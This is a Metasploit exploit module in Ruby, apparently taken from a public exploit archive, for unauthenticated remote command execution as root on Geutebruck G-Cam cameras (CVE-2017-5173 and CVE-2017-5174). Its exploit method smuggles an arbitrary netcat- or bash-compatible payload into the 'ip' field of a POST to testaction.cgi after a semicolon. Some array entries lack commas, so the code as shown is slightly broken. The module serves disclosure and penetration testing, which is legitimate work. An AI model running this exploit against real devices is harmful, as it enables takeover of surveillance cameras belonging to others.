# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Geutebruck testaction.cgi Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a an arbitrary command execution vulnerability. The
        vulnerability exists in the /uapi-cgi/viewer/testaction.cgi page and allows an
        anonymous user to execute arbitrary commands with root privileges.
        Firmware <= 1.11.0.12 are concerned.
        Tested on 5.02024 G-Cam/EFD-2250 running 1.11.0.12 firmware.
      },
      &#039;Author&#039;         =>
        [
          &#039;Davy Douhine&#039;,   #CVE-2017-5173 (RCE) and metasploit module
          &#039;Florent Montel&#039;  #CVE-2017-5174 (Authentication bypass)
          &#039;Frederic Cikala&#039; #CVE-2017-5174 (Authentication bypass)
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-5173&#039; ],
          [ &#039;CVE&#039;, &#039;2017-5174&#039; ],
          [ &#039;URL&#039;, &#039;http://geutebruck.com&#039; ]
          [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-17-045-02&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 1024,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic netcat bash&#039;,
            }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 16 2016&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to webapp&#039;, &#039;/uapi-cgi/viewer/testaction.cgi&#039;]),
      ], self.class)
  end
 
  def exploit
    uri = normalize_uri(target_uri.path)
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    command = payload.encoded
    res = send_request_cgi(
      {
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;type&#039; => "ip",
          &#039;ip&#039; => "eth0 1.1.1.1;#{command}",
        },
    })
  end
 
end

